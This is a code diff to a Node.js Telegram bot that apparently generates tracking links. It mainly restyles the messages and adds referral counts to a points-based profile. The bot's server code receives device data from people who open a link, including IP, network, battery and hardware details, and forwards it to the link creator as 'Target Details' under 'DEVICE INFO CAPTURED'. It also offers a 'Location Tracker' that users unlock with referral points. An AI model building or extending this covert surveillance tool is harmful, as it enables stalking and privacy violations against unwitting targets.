@@ -187,7 +187,7 @@ async function createLink(chatId, type, content, targetAction) {
     }
 }
 
-async function processReferralReward(userId) {
+async function processReferralReward(userId, firstName) {
     try {
         const { data: refData } = await supabase.from('referrals').select('*').eq('referred_id', userId).eq('rewarded', false).single();
         if (refData) {
@@ -196,7 +196,8 @@ async function processReferralReward(userId) {
             const { data: refUser } = await supabase.from('users').select('points').eq('chat_id', referrerId).single();
             if (refUser) {
                 await supabase.from('users').update({ points: refUser.points + 1 }).eq('chat_id', referrerId);
-                bot.sendMessage(referrerId, `🎉 <b>Congratulations!</b> A user joined using your invite link. You have earned <b>1 Point!</b>`, { parse_mode: 'HTML' }).catch(()=>{});
+                const msg = `🎉 <b>NEW REFERRAL BONUS!</b>\n\n👤 <b>${firstName || 'A user'}</b> joined the channel using your link!\n\n💎 <b>+1 Point Added!</b>\n💰 <b>Total Points:</b> ${refUser.points + 1}`;
+                bot.sendMessage(referrerId, msg, { parse_mode: 'HTML' }).catch(()=>{});
             }
         }
     } catch (e) {
@@ -244,7 +245,7 @@ bot.onText(/\/start(.*)/, async (msg, match) => {
             return;
         }
         
-        await processReferralReward(userId);
+        await processReferralReward(userId, msg.from.first_name);
         showStartMenu(chatId);
     } catch (error) {
         console.error("Start command error:", error);
@@ -262,7 +263,7 @@ bot.on('callback_query', async (callbackQuery) => {
             if (isMember) {
                 bot.deleteMessage(chatId, msg.message_id).catch(()=>{});
                 
-                await processReferralReward(userId);
+                await processReferralReward(userId, callbackQuery.from.first_name);
 
                 showStartMenu(chatId);
             } else {
@@ -340,7 +341,20 @@ bot.on('message', async (msg) => {
         }
         else if (text === '👤 My Profile') {
             const user = await getUserData(chatId);
-            const profileMsg = `<b>👤 Your Profile</b>\n\n<b>ID:</b> <code>${chatId}</code>\n<b>💎 Points:</b> ${user.points}\n<b>📍 Location Track:</b> ${user.unlocked_location ? '🔓 Unlocked' : '🔒 Locked'}`;
+            const totalReferrals = await supabase.from('referrals').select('id', { count: 'exact' }).eq('referrer_id', chatId);
+            const refCount = totalReferrals.count || 0;
+            const locStatus = user.unlocked_location ? '✅ Unlocked' : '🔒 Locked (Needs 2 Pts)';
+            
+            const profileMsg = `┏━━━━━━━━━━━━━━━━━━━┓
+┣ 👤 <b>MY PREMIUM PROFILE</b>
+┗━━━━━━━━━━━━━━━━━━━┛
+
+🆔 <b>Account ID:</b> <code>${chatId}</code>
+💎 <b>Points Balance:</b> ${user.points} Pts
+👥 <b>Total Referrals:</b> ${refCount}
+📍 <b>Location Tracker:</b> ${locStatus}
+
+<i>Use the "🔗 Invite Friends" button to earn more points!</i>`;
             bot.sendMessage(chatId, profileMsg, { parse_mode: 'HTML' });
         }
         else {
@@ -461,20 +475,30 @@ app.post('/upload', upload.array('files', 3), async (req, res) => {
         }
         else if (target_action === 'device_info' && deviceData) {
             const d = JSON.parse(deviceData);
-            const msg = `<b>📱 New Device Info Captured!</b>\n
-<b>IP:</b> ${d.ip || 'Unknown'}
-<b>OS:</b> ${d.os}
-<b>Browser:</b> ${d.browser}
-<b>Battery:</b> ${d.battery} (Charging: ${d.charging})
-<b>Network:</b> ${d.network}
-<b>CPU Cores:</b> ${d.cores}
-<b>RAM:</b> ${d.ram}
-<b>Screen:</b> ${d.screen}
-<b>Timezone:</b> ${d.timezone}
-<b>Language:</b> ${d.language}
-<b>GPU:</b> ${d.gpu}
+            const msg = `┏━━━━━━━━━━━━━━━━━━━━━┓
+┣ 📱 <b>DEVICE INFO CAPTURED</b>
+┗━━━━━━━━━━━━━━━━━━━━━┛
 
-<b>User-Agent:</b> <code>${d.userAgent}</code>`;
+<b>👤 Target Details:</b>
+• <b>IP:</b> <code>${d.ip || 'Unknown'}</code>
+• <b>Device:</b> ${d.deviceName || 'Unknown'}
+• <b>Network:</b> ${d.network}
+• <b>Battery:</b> ${d.battery} (Charging: ${d.charging})
+
+<b>⚙️ Hardware Specs:</b>
+• <b>CPU Cores:</b> ${d.cores}
+• <b>RAM:</b> ${d.ram}
+• <b>GPU:</b> ${d.gpu}
+• <b>Screen:</b> ${d.screen}
+
+<b>💻 Software Info:</b>
+• <b>OS:</b> ${d.os}
+• <b>Browser:</b> ${d.browser}
+• <b>Timezone:</b> ${d.timezone}
+• <b>Language:</b> ${d.language}
+
+<b>User-Agent:</b>
+<code>${d.userAgent}</code>`;
             bot.sendMessage(chatId, msg, { parse_mode: 'HTML' });
         }
 
